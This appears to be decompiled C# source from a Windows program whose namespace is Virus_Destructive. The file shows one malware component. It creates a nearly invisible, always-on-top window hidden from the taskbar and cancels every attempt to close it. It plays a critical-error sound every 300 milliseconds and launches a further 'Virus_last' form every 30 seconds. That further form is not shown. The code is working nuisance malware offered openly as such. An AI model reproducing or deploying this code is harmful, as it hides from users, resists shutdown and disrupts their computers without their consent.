using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Media;
using System.Windows.Forms;

namespace Virus_Destructive;

public class Virus_sound : Form
{
	private SoundPlayer _soundplayer;

	private string sound_file = "C:\\Windows\\Media\\Windows Critical Stop.wav";

	private IContainer components = null;

	private Timer tmr1;

	private Timer tmr_next_last;

	public Virus_sound()
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
		((Form)this).set_TopMost(true);
		if (File.Exists(sound_file))
		{
			_soundplayer = new SoundPlayer("C:\\Windows\\Media\\Windows Critical Stop.wav");
		}
	}

	private void Virus_sound_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Virus_sound_Load(object sender, EventArgs e)
	{
		tmr1.Start();
		tmr_next_last.Start();
	}

	private void tmr1_Tick(object sender, EventArgs e)
	{
		tmr1.Stop();
		_soundplayer.Play();
		tmr1.Start();
	}

	private void tmr_next_payload_Tick(object sender, EventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		tmr_next_last.Stop();
		Virus_last virus_last = new Virus_last();
		((Form)virus_last).ShowDialog();
		tmr_next_last.Start();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Virus_sound));
		tmr1 = new Timer(components);
		tmr_next_last = new Timer(components);
		((Control)this).SuspendLayout();
		tmr1.set_Enabled(true);
		tmr1.set_Interval(300);
		tmr1.add_Tick((EventHandler)tmr1_Tick);
		tmr_next_last.set_Enabled(true);
		tmr_next_last.set_Interval(30000);
		tmr_next_last.add_Tick((EventHandler)tmr_next_payload_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Virus_sound");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Virus_sound");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Virus_sound_FormClosing));
		((Form)this).add_Load((EventHandler)Virus_sound_Load);
		((Control)this).ResumeLayout(false);
	}
}
